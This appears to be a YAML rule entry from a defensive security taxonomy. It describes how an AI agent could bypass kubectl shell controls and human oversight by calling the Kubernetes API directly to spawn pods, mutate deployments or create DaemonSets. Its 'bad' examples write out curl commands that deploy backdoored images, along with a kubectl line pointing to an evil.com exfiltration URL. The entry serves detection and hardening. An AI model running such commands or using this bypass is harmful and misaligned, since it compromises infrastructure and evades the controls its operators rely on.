id: "unauthorized-execution/ai-resource-abuse/container-spawn"
version: "1.0.0"
kingdom: "Unauthorized Code Execution"
kingdom_id: 4
category: "AI Resource Abuse"
category_id: "4.5"
name: "AI-Directed Container Spawning via Kubernetes API"
risk_level: "critical"

abstract: |
  An AI agent spawns containers, modifies workload deployments, or escalates
  privileges by making direct HTTP calls to the Kubernetes API — bypassing
  kubectl security controls, validating admission webhooks, and human oversight
  gates — to create unauthorized pods, daemonsets, or RBAC bindings.

explanation: |
  Kubernetes API servers expose a REST interface that accepts the same requests
  as `kubectl`, but without the CLI-level controls that AgentShield and similar
  tools intercept. An AI agent with an HTTP tool and a service account token
  (or kubeconfig credentials) can interact with the K8s API directly, evading
  shell-layer controls that block `kubectl` commands.

  **Primary attack vectors:**

  **Unauthorized pod creation**: An agent can POST to `/api/v1/namespaces/<ns>/pods`
  to spawn a container with any image, including attacker-controlled images,
  privileged mode enabled, or host path mounts. This bypasses PodSecurityPolicy
  or OPA/Gatekeeper admission controls that are enforced only on `kubectl` or
  IDE-initiated requests, not on agent-originated API calls if the service
  account has overly broad permissions.

  **Deployment mutation**: PATCH or PUT to `/apis/apps/v1/namespaces/<ns>/deployments/<name>`
  can modify an existing deployment — changing the container image to a
  backdoored version, adding environment variables with attacker values, or
  scaling replicas to 0 (denial of service).

  **DaemonSet abuse**: Creating a DaemonSet schedules a container on every
  node in the cluster, providing persistent access across the entire fleet
  — a high-impact privilege escalation and persistence mechanism.

  **RBAC privilege escalation (separate rule)**: Covered by the k8s-rbac-escalation
  taxonomy entry. This entry focuses on workload spawning and mutation.

  The core risk is that kubectl restrictions imposed at the shell level can be
  entirely bypassed if the agent's credential scope includes the K8s API and
  the agent has access to an HTTP tool. This is an instance of the general
  "API bypass" pattern: security controls applied to a CLI proxy do not apply
  to direct API access.

  MITRE T1610 (Deploy Container), T1613 (Container and Resource Discovery),
  and T1098 (Account Manipulation) apply.

recommendation: |
  - Block AI agent HTTP access to Kubernetes API mutation endpoints
    (POST/PUT/PATCH/DELETE on pods, deployments, daemonsets, statefulsets).
  - Apply namespace-scoped RBAC — restrict agent service accounts to the
    minimum namespaces and resource types required.
  - Enable Kubernetes audit logging and alert on agent-originated API mutations.
  - Use OPA/Gatekeeper or Kyverno admission policies to enforce workload
    security constraints at the API server level, independent of kubectl.
  - Require human review for any container image changes via GitOps workflows.
  - Segregate agent credentials from deployment credentials at the
    service account level.

examples:
  bad:
    - "curl -X POST https://k8s-api/api/v1/namespaces/default/pods -d '{\"spec\":{\"containers\":[{\"image\":\"attacker/backdoor\"}]}}'"
    - "curl -X PATCH https://k8s-api/apis/apps/v1/namespaces/prod/deployments/web -d '{\"spec\":{\"template\":{\"spec\":{\"containers\":[{\"image\":\"evil:latest\"}]}}}}'"
    - "curl -X POST https://k8s-api/apis/apps/v1/namespaces/kube-system/daemonsets -d @malicious-ds.json"
    - "kubectl run exfil --image=alpine --env='EXFIL_URL=https://evil.com' --restart=Never"
  good:
    - "kubectl get pods -n default  # read-only inspection"
    - "kubectl describe deployment web -n prod  # read-only"
    - "kubectl rollout status deployment/web  # status only"

compliance:
  owasp-llm-2025: ["LLM06", "LLM08"]
  iso-27001-2022: ["A.8.9", "A.5.10", "A.8.3"]
  eu-ai-act-2024: ["Art.14", "Art.15"]
  soc2-type2: ["CC6.3", "CC7.2"]
  iso-42001-2023: ["A.7.4", "A.8.4"]
  mitre_atlas: ["AML.T0038"]

references:
  mitre_attack: ["T1610", "T1613", "T1098", "T1548"]
  cwe: ["CWE-284", "CWE-250", "CWE-862"]
  external:
    - title: "Kubernetes: API Server Authentication"
      url: "https://kubernetes.io/docs/reference/access-authn-authz/authentication/"
    - title: "OWASP LLM06 — Excessive Permissions"
      url: "https://genai.owasp.org/llmrisk/llm062025-excessive-permissions/"
    - title: "MITRE ATT&CK: T1610 — Deploy Container"
      url: "https://attack.mitre.org/techniques/T1610/"

analyzers: ["structural", "regex"]
related_rules:
  - "mcp-k8s-block-pod-mutation"
